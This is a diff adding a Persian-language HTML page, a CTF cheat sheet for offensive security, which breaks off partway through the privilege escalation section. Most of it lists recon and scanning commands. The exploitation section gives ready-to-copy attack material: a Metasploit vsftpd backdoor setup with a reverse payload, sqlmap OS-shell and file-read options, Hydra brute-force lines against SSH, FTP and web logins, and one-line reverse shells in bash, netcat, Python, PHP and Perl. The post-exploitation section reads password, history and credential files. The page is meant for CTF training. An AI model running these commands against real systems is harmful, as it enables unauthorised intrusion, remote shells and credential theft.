@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Master Complete Guide - Full Edition</title>
+    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <style>
+        :root {
+            --bg-color: #0d1117;
+            --card-bg: #161b22;
+            --border-color: #30363d;
+            --text-color: #c9d1d9;
+            --muted-color: #8b949e;
+            --primary-color: #e3b341; /* Gold for Master Guide */
+            --accent-color: #f2cc60;  /* Light Gold accent */
+            --warn-color: #d29922;
+            --danger-color: #f85149;
+            --code-bg: #010409;
+            --hover-bg: #1f2937;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-left: 1px solid var(--border-color);
+            padding: 20px;
+            position: fixed;
+            height: 100vh;
+            overflow-y: auto;
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .sidebar-header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        .sidebar-header h1 {
+            color: var(--primary-color);
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .sidebar-header p {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            text-align: center;
+        }
+
+        .search-box {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .search-box input {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            color: var(--text-color);
+            font-family: 'Vazirmatn', sans-serif;
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+
+        .search-box input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(227, 179, 65, 0.2);
+        }
+
+        .nav-list {
+            list-style: none;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .nav-list li {
+            margin-bottom: 5px;
+        }
+
+        .nav-list li a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            font-size: 0.9rem;
+            border-right: 3px solid transparent;
+        }
+
+        .nav-list li a:hover {
+            background-color: var(--hover-bg);
+            color: var(--primary-color);
+        }
+
+        .nav-list li a.active {
+            background-color: rgba(227, 179, 65, 0.1);
+            color: var(--primary-color);
+            border-right: 3px solid var(--primary-color);
+            font-weight: bold;
+        }
+
+        .nav-badge {
+            font-size: 0.7rem;
+            background: var(--bg-color);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: var(--muted-color);
+        }
+
+        /* Main Content */
+        .main-content {
+            margin-right: 300px;
+            padding: 40px;
+            flex: 1;
+            max-width: 1100px;
+        }
+
+        .main-header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .main-header h1 {
+            color: var(--primary-color);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(227, 179, 65, 0.3);
+        }
+
+        .main-header p {
+            color: var(--muted-color);
+            font-size: 1.1rem;
+        }
+
+        /* Tool Sections */
+        .tool-section {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.2);
+            scroll-margin-top: 20px;
+        }
+
+        .tool-title {
+            color: var(--accent-color);
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+        
+        .sub-tool-title {
+            color: var(--warn-color);
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
+            padding-bottom: 10px;
+            border-bottom: 1px dashed var(--border-color);
+        }
+
+        /* Badges & Tags */
+        .goal-box {
+            background: rgba(227, 179, 65, 0.1);
+            border: 1px solid rgba(227, 179, 65, 0.2);
+            border-right: 4px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            color: var(--primary-color);
+        }
+
+        .sub-title {
+            color: var(--text-color);
+            margin: 25px 0 15px 0;
+            font-size: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .tag-base { background: rgba(227, 179, 65, 0.2); color: var(--primary-color); }
+        .tag-ctf { background: rgba(242, 204, 96, 0.2); color: var(--accent-color); }
+        .tag-tip { background: rgba(210, 153, 34, 0.2); color: var(--warn-color); }
+
+        /* Code Blocks (Terminal Style) */
+        .code-container {
+            position: relative;
+            margin: 15px 0;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: var(--code-bg);
+        }
+
+        .code-header {
+            background: #161b22;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-dots {
+            display: flex;
+            gap: 6px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+
+        .code-lang {
+            color: var(--muted-color);
+            font-size: 0.8rem;
+            font-family: monospace;
+        }
+
+        .copy-btn {
+            background: transparent;
+            color: var(--muted-color);
+            border: 1px solid var(--border-color);
+            padding: 4px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+
+        .copy-btn:hover {
+            background: var(--primary-color);
+            color: #000;
+            border-color: var(--primary-color);
+        }
+
+        pre {
+            background-color: var(--code-bg) !important;
+            padding: 15px !important;
+            border-radius: 0;
+            overflow-x: auto;
+            margin: 0;
+            direction: ltr;
+            text-align: left;
+            max-height: 600px;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 0.9rem;
+        }
+
+        /* Table Styles */
+        .table-container {
+            overflow-x: auto;
+            margin: 20px 0;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background-color: var(--bg-color);
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background-color: var(--hover-bg);
+        }
+
+        /* ASCII Workflow Block */
+        .ascii-box {
+            background: rgba(227, 179, 65, 0.05);
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: monospace;
+            line-height: 1.2;
+            color: var(--accent-color);
+            white-space: pre;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left;
+        }
+
+        /* Success Formula Block */
+        .success-box {
+            background: linear-gradient(145deg, rgba(227, 179, 65, 0.1), rgba(242, 204, 96, 0.05));
+            border: 1px solid var(--primary-color);
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 1.2rem;
+            color: var(--accent-color);
+            line-height: 2;
+            box-shadow: 0 0 15px rgba(227, 179, 65, 0.1);
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            body { flex-direction: column; }
+            .sidebar {
+                position: relative;
+                width: 100%;
+                height: auto;
+                border-left: none;
+                border-bottom: 1px solid var(--border-color);
+            }
+            .main-content {
+                margin-right: 0;
+                padding: 20px;
+                width: 100%;
+            }
+            .nav-list { max-height: 200px; }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-color); }
+    </style>
+</head>
+<body>
+
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <h1>🏆 CTF MASTER</h1>
+            <p>Complete Guide - Final Edition</p>
+        </div>
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="🔎 جستجوی مرحله..." oninput="filterTools()">
+        </div>
+        <ul class="nav-list" id="navList">
+            <li><a href="#workflow">🎯 CTF Master Workflow <span class="nav-badge">Map</span></a></li>
+            <li><a href="#recon">1. RECONNAISSANCE <span class="nav-badge">Info</span></a></li>
+            <li><a href="#vulnscan">2. VULN SCANNING <span class="nav-badge">Scan</span></a></li>
+            <li><a href="#exploit">3. EXPLOITATION <span class="nav-badge">Attack</span></a></li>
+            <li><a href="#postexploit">4. POST-EXPLOIT <span class="nav-badge">Enum</span></a></li>
+            <li><a href="#privesc">5. PRIVILEGE ESC <span class="nav-badge">Root</span></a></li>
+            <li><a href="#reporting">6. REPORTING <span class="nav-badge">Doc</span></a></li>
+            <li><a href="#master_ref">🔥 MASTER REFERENCE <span class="nav-badge">One-Liner</span></a></li>
+            <li><a href="#formula">🏆 SUCCESS FORMULA <span class="nav-badge">CTF</span></a></li>
+        </ul>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <header class="main-header">
+            <h1>راهنمای نهایی و جامع مسابقات CTF</h1>
+            <p>نسخه کامل و بدون حذفیات - نقشه راه، دستورات کلیدی و فرمول موفقیت</p>
+        </header>
+
+        <!-- Table of Tools -->
+        <section class="tool-section">
+            <h2 class="tool-title">📋 فهرست کامل تمام ابزارها و مراحل CTF</h2>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>مرحله</th>
+                            <th>ابزارهای اصلی</th>
+                            <th>اولویت</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr><td>1</td><td>Passive Recon</td><td>WHOIS, DIG, theHarvester, Shodan, Google Dorks</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>2</td><td>Active Recon</td><td>Ping, Host, Nslookup, Dig, Traceroute, Nmap</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>3</td><td>Web Recon</td><td>WhatWeb, Wafw00f, Nikto, Gobuster, FFUF, Dirb, Dirsearch</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>4</td><td>Service Enum</td><td>Nmap NSE, enum4linux, smbclient, snmpwalk, ldapsearch</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>5</td><td>Vulnerability Scan</td><td>Nmap NSE, Nikto, Nuclei, SearchSploit</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>6</td><td>Exploitation</td><td>Metasploit, SearchSploit, SQLMap, Hydra, Burp Suite</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>7</td><td>Post-Exploit</td><td>LinPEAS, LinEnum, pspy, linux-exploit-suggester</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>8</td><td>Privilege Esc</td><td>SUID, Sudo, Cron, Capabilities, Kernel Exploits</td><td>⭐⭐⭐⭐⭐</td></tr>
+                        <tr><td>9</td><td>Reporting</td><td>Automated Report Generation</td><td>⭐⭐⭐⭐</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- Workflow -->
+        <section id="workflow" class="tool-section">
+            <h2 class="tool-title">🎯 CTF MASTER WORKFLOW</h2>
+            <div class="goal-box"><strong>📌 هدف:</strong> درک مسیر کلی یک مسابقه CTF از شروع تا پایان</div>
+            
+            <div class="ascii-box">┌─────────────────────────────────────────────────────────────────┐
+│                   1. RECONNAISSANCE                            │
+├─────────────────────────────────────────────────────────────────┤
+│  PASSIVE              │  ACTIVE              │  WEB            │
+│  ──────────           │  ──────────          │  ──────────     │
+│  whois                │  ping                │  whatweb        │
+│  dig                  │  host                │  wafw00f        │
+│  theHarvester         │  nslookup            │  nikto          │
+│  shodan               │  dig                 │  gobuster       │
+│  google dorks         │  traceroute          │  ffuf           │
+│                       │  nmap                │  dirb           │
+│                       │                     │  dirsearch      │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│                2. SCANNING & VULNERABILITY                      │
+├─────────────────────────────────────────────────────────────────┤
+│  PORT SCAN          │  SERVICE DETECTION   │  VULN SCAN       │
+│  ──────────         │  ──────────          │  ──────────      │
+│  nmap -p-           │  nmap -sV            │  nmap --script   │
+│  masscan            │  nmap -O             │  nikto           │
+│                     │                      │  nuclei          │
+│                     │                      │  searchsploit    │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│                     3. EXPLOITATION                            │
+├─────────────────────────────────────────────────────────────────┤
+│  SEARCH             │  FRAMEWORK           │  WEB             │
+│  ──────────         │  ──────────          │  ──────────      │
+│  searchsploit       │  msfconsole          │  sqlmap          │
+│  exploit-db         │  use exploit         │  burp suite      │
+│                     │  set RHOSTS          │  manual testing  │
+│                     │  run                 │                  │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│                   4. POST-EXPLOITATION                          │
+├─────────────────────────────────────────────────────────────────┤
+│  LINUX              │  WINDOWS            │  ENUM             │
+│  ──────────         │  ──────────         │  ──────────       │
+│  whoami             │  whoami             │  linpeas          │
+│  uname -a           │  systeminfo         │  pspy             │
+│  cat /etc/passwd    │  net user           │  enum4linux       │
+│  ps aux             │  tasklist           │  snmpwalk         │
+│  ip addr            │  ipconfig           │                   │
+│  find / -name flag  │  findstr            │                   │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│                   5. PRIVILEGE ESCALATION                       │
+├─────────────────────────────────────────────────────────────────┤
+│  SUID               │  SUDO               │  CRON             │
+│  ──────────         │  ──────────         │  ──────────       │
+│  find / -perm -4000 │  sudo -l            │  cat /etc/crontab │
+│                     │                     │                   │
+│  CAPABILITIES       │  KERNEL             │  CREDENTIALS      │
+│  ──────────         │  ──────────         │  ──────────       │
+│  getcap -r /        │  exploit-suggester  │  cat ~/.bash_hist │
+└─────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────┐
+│                        6. REPORTING                            │
+├─────────────────────────────────────────────────────────────────┤
+│  python3 ctf_reporter.py -t TARGET                             │
+│  • report.html  • report.md  • report.txt                      │
+│  • Executive Summary  • Attack Paths  • Findings              │
+└─────────────────────────────────────────────────────────────────┘</div>
+        </section>
+
+        <!-- 1. RECONNAISSANCE -->
+        <section id="recon" class="tool-section">
+            <h2 class="tool-title">1️⃣ RECONNAISSANCE CHEAT SHEET</h2>
+            
+            <h3 class="sub-title">Passive Recon</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== WHOIS ==========
+whois example.com
+whois example.com | grep -i "registrar\|creation\|expiry\|name server"
+
+# ========== DIG ==========
+dig example.com A +short
+dig example.com MX +short
+dig example.com NS +short
+dig example.com TXT +short
+dig example.com ANY
+
+# ========== theHarvester ==========
+theHarvester -d example.com -b google
+theHarvester -d example.com -b bing
+theHarvester -d example.com -b all
+
+# ========== Shodan ==========
+shodan host 8.8.8.8
+shodan search "domain:example.com"
+
+# ========== Google Dorks ==========
+site:example.com
+site:example.com filetype:pdf
+site:example.com intitle:admin
+site:example.com inurl:login
+site:example.com "password"</code></pre>
+            </div>
+
+            <h3 class="sub-title">Active Recon</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== PING ==========
+ping -c 4 example.com
+ping -c 4 192.168.1.10
+
+# ========== HOST ==========
+host example.com
+host -t MX example.com
+host -t NS example.com
+
+# ========== NSLOOKUP ==========
+nslookup example.com
+nslookup -type=MX example.com
+nslookup -type=NS example.com
+
+# ========== DIG ==========
+dig example.com +short
+dig example.com MX +short
+dig example.com NS +short
+
+# ========== TRACEROUTE ==========
+traceroute example.com
+traceroute -I example.com
+
+# ========== NMAP ==========
+nmap -sn 192.168.1.0/24           # Host Discovery
+nmap -T4 -F 192.168.1.10          # Quick Port Scan
+nmap -p- 192.168.1.10             # Full Port Scan
+nmap -sV 192.168.1.10             # Service Detection
+nmap -O 192.168.1.10              # OS Detection
+nmap -sC 192.168.1.10             # Default Scripts
+nmap -A 192.168.1.10              # Aggressive Scan</code></pre>
+            </div>
+
+            <h3 class="sub-title">Web Recon</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== WHATWEB ==========
+whatweb example.com
+whatweb -a 3 example.com
+
+# ========== WAFW00F ==========
+wafw00f example.com
+
+# ========== NIKTO ==========
+nikto -h example.com
+nikto -h https://example.com -ssl
+
+# ========== GOBUSTER ==========
+gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html
+
+# ========== FFUF ==========
+ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 404,403
+ffuf -u http://example.com/FUZZ -w wordlist.txt -e .php,.txt,.html
+
+# ========== DIRB ==========
+dirb http://example.com
+dirb http://example.com -X .php,.txt
+
+# ========== DIRSEARCH ==========
+dirsearch -u http://example.com
+dirsearch -u http://example.com -e php,txt,html</code></pre>
+            </div>
+
+            <h3 class="sub-title">Service Enumeration</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== FTP (21) ==========
+nmap -p21 --script=ftp-* TARGET
+ftp -n TARGET <<EOF
+user anonymous anonymous
+ls
+quit
+EOF
+
+# ========== SSH (22) ==========
+nmap -p22 --script=ssh-* TARGET
+ssh -v user@TARGET
+
+# ========== SMTP (25) ==========
+nmap -p25 --script=smtp-* TARGET
+nc TARGET 25
+VRFY root
+
+# ========== DNS (53) ==========
+dnsrecon -d example.com -t axfr
+dnsrecon -d example.com -t brt
+dnsenum example.com
+
+# ========== SMB (139/445) ==========
+enum4linux TARGET
+smbclient -L //TARGET -N
+smbmap -H TARGET
+
+# ========== SNMP (161) ==========
+snmpwalk -v2c -c public TARGET
+onesixtyone -c /usr/share/wordlists/snmp.txt TARGET
+
+# ========== LDAP (389) ==========
+ldapsearch -x -H ldap://TARGET -b ""
+
+# ========== MySQL (3306) ==========
+nmap -p3306 --script=mysql-* TARGET
+mysql -h TARGET -u root -p
+
+# ========== Redis (6379) ==========
+redis-cli -h TARGET INFO
+redis-cli -h TARGET KEYS *</code></pre>
+            </div>
+        </section>
+
+        <!-- 2. VULNERABILITY SCANNING -->
+        <section id="vulnscan" class="tool-section">
+            <h2 class="tool-title">2️⃣ VULNERABILITY SCANNING CHEAT SHEET</h2>
+            
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== NMAP NSE ==========
+nmap --script=vuln TARGET
+nmap --script=vuln -p80,443 TARGET
+nmap --script=exploit* TARGET
+nmap --script=discovery* TARGET
+
+# ========== NMAP NSE CATEGORIES ==========
+# auth, broadcast, brute, default, discovery, dos,
+# exploit, external, fuzzer, intrusive, malware,
+# safe, version, vuln
+
+# ========== NIKTO ==========
+nikto -h http://TARGET
+nikto -h https://TARGET -ssl
+nikto -h TARGET -p 8080
+
+# ========== NUCLEI ==========
+nuclei -u example.com
+nuclei -u example.com -severity critical,high
+nuclei -u example.com -t cves/
+
+# ========== SEARCHSPLOIT ==========
+searchsploit vsftpd
+searchsploit apache 2.4.49
+searchsploit CVE-2021-44228
+searchsploit -j apache | jq '.RESULTS_EXPLOIT[].Title'
+searchsploit -m 50149    # Copy exploit to current dir</code></pre>
+            </div>
+        </section>
+
+        <!-- 3. EXPLOITATION -->
+        <section id="exploit" class="tool-section">
+            <h2 class="tool-title">3️⃣ EXPLOITATION CHEAT SHEET</h2>
+            
+            <h3 class="sub-title">Metasploit</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== START ==========
+msfconsole
+
+# ========== SEARCH ==========
+search vsftpd
+search apache
+search type:exploit
+search platform:linux
+
+# ========== USE ==========
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+# ========== CONFIGURE ==========
+show options
+set RHOSTS 192.168.1.10
+set RPORT 21
+set PAYLOAD cmd/unix/reverse
+set LHOST 10.0.0.1
+set LPORT 4444
+
+# ========== RUN ==========
+run
+exploit
+
+# ========== SESSIONS ==========
+sessions
+sessions -i 1
+sessions -k 1</code></pre>
+            </div>
+
+            <h3 class="sub-title">SQLMap</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== BASIC ==========
+sqlmap -u http://target/page?id=1
+sqlmap -u http://target/login --forms
+sqlmap -u http://target/page?id=1 --cookie="PHPSESSID=value"
+
+# ========== DATABASE ==========
+sqlmap -u http://target/page?id=1 --dbs
+sqlmap -u http://target/page?id=1 -D dbname --tables
+sqlmap -u http://target/page?id=1 -D dbname -T table --dump
+
+# ========== ADVANCED ==========
+sqlmap -u http://target/page?id=1 --level=3 --risk=2
+sqlmap -u http://target/page?id=1 --os-shell
+sqlmap -u http://target/page?id=1 --file-read=/etc/passwd
+sqlmap -u http://target/page?id=1 --tamper=space2comment</code></pre>
+            </div>
+
+            <h3 class="sub-title">Hydra</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== SSH ==========
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4
+
+# ========== FTP ==========
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET -t 4
+
+# ========== HTTP ==========
+hydra -l admin -P wordlist.txt http-post-form://TARGET/login:username=^USER^&password=^PASS^:Invalid
+
+# ========== MYSQL ==========
+hydra -l root -P wordlist.txt mysql://TARGET -t 4</code></pre>
+            </div>
+
+            <h3 class="sub-title">Reverse Shells</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== BASH ==========
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+
+# ========== NETCAT ==========
+nc -e /bin/sh LHOST LPORT
+
+# ========== PYTHON ==========
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+
+# ========== PHP ==========
+php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# ========== PERL ==========
+perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre>
+            </div>
+
+            <h3 class="sub-title">Listeners</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== NETCAT ==========
+nc -lvnp LPORT
+rlwrap nc -lvnp LPORT
+
+# ========== SSL ==========
+ncat -lvnp LPORT --ssl
+
+# ========== SOCAT ==========
+socat TCP-LISTEN:LPORT,fork,reuseaddr EXEC:/bin/sh,stderr</code></pre>
+            </div>
+        </section>
+
+        <!-- 4. POST-EXPLOITATION -->
+        <section id="postexploit" class="tool-section">
+            <h2 class="tool-title">4️⃣ POST-EXPLOITATION CHEAT SHEET</h2>
+            
+            <h3 class="sub-title">Linux Post-Exploit</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== USER INFO ==========
+whoami
+id
+groups
+lastlog
+
+# ========== SYSTEM INFO ==========
+uname -a
+cat /etc/os-release
+hostname
+
+# ========== USER ENUM ==========
+cat /etc/passwd
+cat /etc/group
+ls /home
+
+# ========== PROCESS ENUM ==========
+ps aux
+ps -ef
+top -b -n 1
+
+# ========== NETWORK ENUM ==========
+ip addr
+ip route
+ss -tulpn
+netstat -tulpn
+
+# ========== FILE SYSTEM ==========
+find / -name "flag*" 2>/dev/null
+find / -name "user.txt" 2>/dev/null
+find / -name "root.txt" 2>/dev/null
+ls -la /etc /home /var /tmp /opt /root
+
+# ========== CREDENTIALS ==========
+find / -name ".env" -type f 2>/dev/null
+find / -name "wp-config.php" -type f 2>/dev/null
+grep -r "password" /etc 2>/dev/null | head -20
+cat ~/.bash_history
+cat ~/.zsh_history
+
+# ========== SUID ==========
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+# ========== SUDO ==========
+sudo -l
+
+# ========== CRON ==========
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+
+# ========== CAPABILITIES ==========
+getcap -r / 2>/dev/null</code></pre>
+            </div>
+
+            <h3 class="sub-title">Windows Post-Exploit</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">cmd</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash">:: ========== SYSTEM INFO ==========
+systeminfo
+hostname
+
+:: ========== USER INFO ==========
+whoami
+whoami /all
+net user
+net localgroup
+
+:: ========== PROCESS ==========
+tasklist
+tasklist /v
+
+:: ========== NETWORK ==========
+ipconfig /all
+route print
+netstat -ano
+
+:: ========== SERVICES ==========
+sc query
+sc query service_name
+
+:: ========== POWERSHELL ==========
+powershell -Command "Get-Process"
+powershell -Command "Get-LocalUser"
+powershell -Command "Get-Service"
+powershell -Command "Get-ChildItem -Path C:\ -Recurse -Include *flag*"</code></pre>
+            </div>
+        </section>
+
+        <!-- 5. PRIVILEGE ESCALATION -->
+        <section id="privesc" class="tool-section">
+            <h2 class="tool-title">5️⃣ PRIVILEGE ESCALATION CHEAT SHEET</h2>
+            
+            <h3 class="sub-title">Linux PE</h3>
+            <div class="code-container">
+                <div class="code-header">
+                    <div class="code-dots"><div class="dot dot-red"></div><div class="dot dot-yellow"></div><div class="dot dot-green"></div></div>
+                    <span class="code-lang">bash</span>
+                    <button class="copy-btn" onclick="copyCode(this)">کپی</button>
+                </div>
+                <pre><code class="language-bash"># ========== SUID BINARIES ==========
+find / -perm -4000 -type f 2>/dev/null
+
+# ========== COMMON SUID BINARIES ==========
+# nmap, vim, find, bash, python, perl, php, nc, socat, cp, mv, tar
+
+# ========== SUDO ==========
+sudo -l
+
